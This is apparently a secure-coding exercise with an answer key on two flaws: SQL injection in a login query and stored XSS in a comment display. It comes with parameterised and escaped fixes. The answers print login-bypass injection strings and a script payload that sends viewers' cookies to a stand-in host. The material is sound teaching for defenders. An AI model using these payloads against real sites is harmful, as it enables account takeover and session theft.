# Day 16 — read these two snippets. What's wrong? Rewrite each safely.

*(Language is Python-ish pseudocode; the flaw and the fix are the same in any language.)*

---

## Snippet A — a login handler

```python
def login(request):
    name = request.form["username"]
    pw   = request.form["password"]
    query = "SELECT id, role FROM users WHERE username = '" + name + \
            "' AND password = '" + hash(pw) + "'"
    row = db.execute(query).fetchone()
    if row:
        start_session(row["id"], row["role"])
        return redirect("/dashboard")
    return "Invalid login"
```

1. What is the vulnerability?
2. Show an input that bypasses the password check.
3. Rewrite the query line the safe way.

---

## Snippet B — a comment display

```python
def show_comments(post_id):
    comments = db.execute(
        "SELECT author, body FROM comments WHERE post_id = ?", [post_id]
    ).fetchall()                     # <- note: this query is fine
    html = "<h2>Comments</h2>"
    for c in comments:
        html += "<div class='c'><b>" + c["author"] + "</b>: " + c["body"] + "</div>"
    return html
```

1. Snippet B's *query* is safe. Where is the vulnerability instead?
2. What does an attacker put in `body` to attack every future reader?
3. Rewrite the loop the safe way (name the technique).

---

## Answers (don't peek)

**A.** SQL injection — `name` is concatenated into the query string.
Bypass: username `admin' -- ` (or `' OR '1'='1' -- `).
Fix:
```python
row = db.execute(
    "SELECT id, role FROM users WHERE username = ? AND password = ?",
    [name, hash(pw)]
).fetchone()
```
(The `?` placeholders bind `name`/`pw` as *values* — the DB never parses them as SQL.)

**B.** Stored XSS — `c["author"]` and `c["body"]` go straight into HTML with no encoding.
Attack: `body` = `<script>fetch('//me/'+document.cookie)</script>` — runs for every viewer.
Fix: HTML-encode on output (or use a templating engine that auto-escapes):
```python
from html import escape
html += f"<div class='c'><b>{escape(c['author'])}</b>: {escape(c['body'])}</div>"
```
Plus: send a `Content-Security-Policy` header and set the session cookie `HttpOnly`.
